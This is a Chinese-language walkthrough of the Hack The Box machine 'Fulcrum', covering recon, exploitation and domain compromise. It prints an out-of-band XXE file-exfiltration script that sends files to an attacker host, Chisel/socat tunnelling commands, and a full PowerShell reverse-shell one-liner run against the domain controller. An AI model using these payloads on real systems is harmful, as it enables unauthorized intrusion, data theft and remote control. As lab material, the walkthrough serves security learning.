

# 域渗透实战之fulcrum - 先知社区

域渗透实战之fulcrum

- - -

# 信息收集

## 端口扫描

使用nmap进行端口扫描，发现存在大量端口开放。

[![](assets/1699929055-d4c33dc5c42ccdc4ecf0c4803bbd31c1.png)](https://xzfile.aliyuncs.com/media/upload/picture/20231113103814-b17aebc6-81cd-1.png)

接着去查看其版本和对应的服务。

[![](assets/1699929055-180b3397303201edaa01c41b0e7beadc.png)](https://xzfile.aliyuncs.com/media/upload/picture/20231113103822-b6c11592-81cd-1.png)

## Fuzz接口

使用wfuzz对其url路径后的参数进行枚举。

[![](assets/1699929055-bbb6b09552ab1822aeaef8d490417ada.png)](https://xzfile.aliyuncs.com/media/upload/picture/20231113103830-bb2f6746-81cd-1.png)

## 目录遍历

使用工具进行目录枚举，未发现有用的目录。

[![](assets/1699929055-fefd4deef54d54af22f482ff9ce233eb.png)](https://xzfile.aliyuncs.com/media/upload/picture/20231113103838-c0147062-81cd-1.png)

接着去看服务，访问端口为4的页面。

[![](assets/1699929055-00d907f9df8637493c396bef06c2dc77.png)](https://xzfile.aliyuncs.com/media/upload/picture/20231113103846-c504817a-81cd-1.png)

## 目录暴力破解

然后继续对其进行爆破，发现存在home.php.

[![](assets/1699929055-25071d845ede7caa1aa589c4b88d0125.png)](https://xzfile.aliyuncs.com/media/upload/picture/20231113103908-d1b01dbc-81cd-1.png)

然后尝试进行上传，发现没法上传成功。

[![](assets/1699929055-ebf613824ccbfe2f41de238bd0670911.png)](https://xzfile.aliyuncs.com/media/upload/picture/20231113103915-d6326c78-81cd-1.png)

## 88端口

访问88端口，发现存在phpadmin登录界面。

[![](assets/1699929055-90bc1298c9ae42f7356eb7166639400b.png)](https://xzfile.aliyuncs.com/media/upload/picture/20231113103924-db600f2a-81cd-1.png)

尝试弱口令登录，没有成功。

[![](assets/1699929055-638bbf52378436bc39a753d03e727da4.png)](https://xzfile.aliyuncs.com/media/upload/picture/20231113103934-e17a6824-81cd-1.png)

## 56423端口

使用curl进行测试，发现有回显。

[![](assets/1699929055-b13e48d77bcb65fc4182bd51ce838662.png)](https://xzfile.aliyuncs.com/media/upload/picture/20231113103945-e8145d70-81cd-1.png)

# 漏洞利用

## xxe漏洞

接着使用burp，然后抓包。

[![](assets/1699929055-f1f5fd922a67bb3693ec0fb1c12a3afd.png)](https://xzfile.aliyuncs.com/media/upload/picture/20231113103953-ecfc53a6-81cd-1.png)

发现其存在xxe漏洞

[![](assets/1699929055-ea24431f4f27c0788463d484b0c02691.png)](https://xzfile.aliyuncs.com/media/upload/picture/20231113104001-f19e5f94-81cd-1.png)

## 文件泄露

然后使用xxe进行加载.dtd文件来读取文件。

[![](assets/1699929055-545f5c925f8c58a23c4d3e832ed64d04.png)](https://xzfile.aliyuncs.com/media/upload/picture/20231113104010-f6d948ac-81cd-1.png)

## xxe文件读取

开启http服务。

[![](assets/1699929055-23ae512376401b7b741314b15d3d39d8.png)](https://xzfile.aliyuncs.com/media/upload/picture/20231113104019-fc8407f6-81cd-1.png)

然后将读取到的内容进行解码，成功获取到读取的内容

[![](assets/1699929055-23055b950579f6679e3e9e4f22848d57.png)](https://xzfile.aliyuncs.com/media/upload/picture/20231113104027-0148fec2-81ce-1.png)

# 权限提升

## SSRF漏洞

### 编写脚本

```plain
#!/usr/bin/python3

import base64
import logging
import readline
import requests
import threading
import time
from flask import Flask, request

log = logging.getLogger('werkzeug')
log.setLevel(logging.ERROR)

app = Flask(__name__)
prev_data = ""

xml_template = """<?xml version="1.0" encoding="utf-8"?>
<!DOCTYPE data SYSTEM "http://10.10.14.6/dtd?fn={}">
<data>&send;</data>"""

@app.route("/dtd")
def dtd():
    fn = request.args['fn']
    return f"""<!ENTITY % file SYSTEM "php://filter/convert.base64-encode/resource={fn}">
    <!ENTITY % all "<!ENTITY send SYSTEM 'http://10.10.14.6/exfil?data=%file;'>">
    %all;"""


@app.route("/exfil")
def data():
    global prev_data
    b64data = request.args['data'].replace(' ', '+') # Flask tries to URL decode it
    print(b64data)
    print(len(b64data))
    data = base64.b64decode(b64data).decode().strip()
    if data != prev_data:
        print(data)
        prev_data = data
    return ""


def web():
    app.run(host="0.0.0.0", port=80)


if __name__ == "__main__":
    threading.Thread(target=web, daemon=True).start()
    time.sleep(1)
    #app.run(debug=True, use_reloader=False, host="0.0.0.0", port=80)
    while True:
        try:
            fn = input("file> ")
            xml = xml_template.format(fn)
            requests.post('http://10.10.10.62:56423', data=xml)
        except KeyboardInterrupt:
            print()
```

## 反弹shell

执行脚本来反弹shell

[![](assets/1699929055-f3581562612c8f7a60541e8dd09a6471.png)](https://xzfile.aliyuncs.com/media/upload/picture/20231113104053-107d2986-81ce-1.png)

开启http服务。

[![](assets/1699929055-74db3c2c3794798fc6fd8651d74a8216.png)](https://xzfile.aliyuncs.com/media/upload/picture/20231113104103-16574fd0-81ce-1.png)

[![](assets/1699929055-c9b81a336f43ab52dab18d8516506c43.png)](https://xzfile.aliyuncs.com/media/upload/picture/20231113104110-1a9f7a9a-81ce-1.png)

发现该脚本可以成功执行命令。

[![](assets/1699929055-9f4cb4f79087b6e1575031f7da25bc1b.png)](https://xzfile.aliyuncs.com/media/upload/picture/20231113104125-239329c6-81ce-1.png)

解码进行查看执行ping之后的内容。  
使用nc进行反弹。

[![](assets/1699929055-5f213c4b1203073e4ff8717804ba9220.png)](https://xzfile.aliyuncs.com/media/upload/picture/20231113104133-28817442-81ce-1.png)

## 获取shell

成功获取webshell

[![](assets/1699929055-a57b8be9cdd4e1434be4611a2fc93b44.png)](https://xzfile.aliyuncs.com/media/upload/picture/20231113104143-2e6833d2-81ce-1.png)

## 查看网络进程。

[![](assets/1699929055-511fac824d0e6d8a8b5c3d4a018177af.png)](https://xzfile.aliyuncs.com/media/upload/picture/20231113104153-342a0ab6-81ce-1.png)

查看端口。

[![](assets/1699929055-d04b38a1ee26376d8f970a1491b7a69d.png)](https://xzfile.aliyuncs.com/media/upload/picture/20231113104200-3876c9e2-81ce-1.png)

# 域渗透

## 网络枚举

上传nmap，然后进行端口扫描，发现其存在5985端口。

[![](assets/1699929055-af866fcbad96ef7e5df718d2979e4980.png)](https://xzfile.aliyuncs.com/media/upload/picture/20231113104218-4342062a-81ce-1.png)

## 翻配置文件

发现存在config.inc.php，并发现了用户名和密码。

[![](assets/1699929055-a4b446fc3bb3bbada22f387ab4f90324.png)](https://xzfile.aliyuncs.com/media/upload/picture/20231113104227-48b2c8ba-81ce-1.png)

## 解密密码

[![](assets/1699929055-342b84cc617782ac02ea928d01de3d6b.png)](https://xzfile.aliyuncs.com/media/upload/picture/20231113104235-4d5c3a68-81ce-1.png)

## 隧道搭建

上传Chisel，然后搭建隧道。

[![](assets/1699929055-81f988c6deb293405ac58be0b0dc7d5c.png)](https://xzfile.aliyuncs.com/media/upload/picture/20231113104249-55d0a940-81ce-1.png)

```plain
./socat tcp-listen:60218,reuseaddr,fork tcp:192.168.122.228:5985 &
./chisel_1.9.1_linux_amd64 server -p 8000 --reverse
./chisel_1.9.1_linux_amd64 client 10.10.14.39:8001 R:socks
./socat tcp-listen:55555,reuseaddr,fork tcp:192.168.122.228:5985
socat tcp-listen:5985,reuseaddr,fork tcp:10.10.16.5:55555
```

[![](assets/1699929055-c2e9b839e82534ddd0b6ce4f141b496a.png)](https://xzfile.aliyuncs.com/media/upload/picture/20231113104259-5b8c95ba-81ce-1.png)

然后在kali里面配置prtoychains，然后进行连接测试。

[![](assets/1699929055-830b0da53e42bccfdad10f621e3f18b3.png)](https://xzfile.aliyuncs.com/media/upload/picture/20231113104307-6020f8a0-81ce-1.png)

## Winrm获取shell

发现存在dc和laap的连接记录。

[![](assets/1699929055-d12c6d6f33708968d5700a33aecb597d.png)](https://xzfile.aliyuncs.com/media/upload/picture/20231113104314-64943c26-81ce-1.png)

## LDAP查询

鉴于帐户名称和上面的注释，查询活动目录域似乎是个好主意。要从 PowerShell 查询 LDAP，我需要一个DirectoryEntry对象。这些对象被引用为System.DirectoryServices.DirectoryEntry, 或ADSI。有多种构造函数（创建对象的方法），但我将使用这个，因为它允许我传递用户名和密码。

## 搜索用户

[![](assets/1699929055-d265370aeeb7a99a91670ac274ac4c2e.png)](https://xzfile.aliyuncs.com/media/upload/picture/20231113104323-6a195dfc-81ce-1.png)

## 使用原始 PowerShell 进行枚举

发现有8个用户，它们全部转储并滚动浏览

[![](assets/1699929055-e9d0dd0c59ebd9cd4bb4fbd183c131d6.png)](https://xzfile.aliyuncs.com/media/upload/picture/20231113104330-6e3f5882-81ce-1.png)

查询域管理员

[![](assets/1699929055-3e52caebad74c53867c94b2deaba1c61.png)](https://xzfile.aliyuncs.com/media/upload/picture/20231113104337-723f6c92-81ce-1.png)

## 上传PowerView工具

上传脚本，然后执行。

[![](assets/1699929055-45296d0d6ba6e0cdd2b941987c9ee594.png)](https://xzfile.aliyuncs.com/media/upload/picture/20231113104345-7719dfa4-81ce-1.png)

执行命令  
获取user.txt

[![](assets/1699929055-12b94ef0fc90bd1f5cb7b277cdd81bc5.png)](https://xzfile.aliyuncs.com/media/upload/picture/20231113104356-7d5a88e6-81ce-1.png)

.\\c.execlient10.10.14.39:8000R:5985:192.168.122.132:5985

隧道  
[![](assets/1699929055-4c3df168934954ae12948c7210fb56ca.png)](https://xzfile.aliyuncs.com/media/upload/picture/20231113104404-823fbc46-81ce-1.png)

枚举

[![](assets/1699929055-77b2fa26aa19332d5961ce033d2d5b5d.png)](https://xzfile.aliyuncs.com/media/upload/picture/20231113104413-87e7d8f4-81ce-1.png)

查看共享。

[![](assets/1699929055-f7467a99c494e761d0e95f4115e1efe0.png)](https://xzfile.aliyuncs.com/media/upload/picture/20231113104429-914d4636-81ce-1.png)

## 发现域管密码

[![](assets/1699929055-ee1f15b87abe06c3def74778063c0af9.png)](https://xzfile.aliyuncs.com/media/upload/picture/20231113104435-95137a4c-81ce-1.png)

获取root.txt  
读取到root.txt

[![](assets/1699929055-38528d9791459d01e18fac9ddda11092.png)](https://xzfile.aliyuncs.com/media/upload/picture/20231113104444-9a08b0e4-81ce-1.png)

## 反弹shell

执行命令，然后使用nc来反弹shell。

```plain
Invoke-Command -Computer dc.fulcrum.local -Credential $cred -scriptblock { $client = New-Object System.Net.Sockets.TCPClient('10.10.14.6',53);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()  }
```

[![](assets/1699929055-8ca83f1b4673788586921adc02da81a8.png)](https://xzfile.aliyuncs.com/media/upload/picture/20231113104457-a218ddd6-81ce-1.png)

REF:  
[https://www.cnblogs.com/autopwn/p/14049762.html](https://www.cnblogs.com/autopwn/p/14049762.html)  
[https://www.hackingarticles.in/hack-the-box-fulcrum-walkthrough/](https://www.hackingarticles.in/hack-the-box-fulcrum-walkthrough/)
